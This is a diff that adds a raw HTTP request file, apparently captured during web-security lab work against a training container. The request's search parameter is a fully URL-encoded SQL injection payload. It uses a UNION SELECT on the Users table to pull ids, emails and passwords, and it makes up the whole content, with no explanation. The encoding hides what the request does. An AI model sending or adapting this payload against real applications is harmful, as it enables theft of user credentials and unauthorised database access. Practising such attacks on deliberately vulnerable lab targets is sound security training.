@@ -1,0 +1,13 @@
+GET /rest/products/search?q=%71%77%65%72%74%27%29%29%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%69%64%2c%20%65%6d%61%69%6c%2c%20%70%61%73%73%77%6f%72%64%2c%20%27%34%27%2c%20%27%35%27%2c%20%27%36%27%2c%20%27%37%27%2c%20%27%38%27%2c%20%27%39%27%20%46%52%4f%4d%20%55%73%65%72%73%2d%2d HTTP/1.1
+Host: z-web-sec-01.westeurope.azurecontainer.io:3000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: language=en; welcomebanner_status=dismiss
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Fri, 03 Sep 2021 10:34:23 GMT
+If-None-Match: W/"784-17bab3948cf"
+Cache-Control: max-age=0
+
